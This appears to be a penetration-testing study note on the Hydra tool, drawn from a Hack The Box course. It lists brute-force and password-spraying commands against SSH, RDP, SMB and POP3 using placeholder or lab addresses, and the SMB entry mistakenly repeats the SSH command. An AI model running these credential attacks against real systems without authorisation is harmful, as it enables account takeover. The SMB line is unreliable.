############
hydra
############

2024-11-30 15:04

Status:

Tags: 

*****************
Description
*****************
A utility for applying wordlist attacks to common services. 

******************
Installation
******************

.. code-block:: console 

   sudo apt install hydra

*****************
Usage
*****************

================== 
SSH
==================

.. code-block:: console

   hydra -L <user.list> -P <password.list> ssh://<tagetIP>

================== 
RDP
==================
Example 1:  Trying both lists

.. code-block:: console

   hydra -L <user.list> -P <password.list> rdp://<targetIP>

Example 2: Password Spraying

.. code-block:: console

   hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

================== 
SMB
==================

.. code-block:: console
   
   hydra -L <user.list> -P <password.list> ssh://<tagetIP>

==================
Hydra for POP3
==================

Example 1: Password spray attack for POP3

.. code-block:: console

   hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3


*****************
References
*****************
https://academy.hackthebox.com/module/116/section/1173
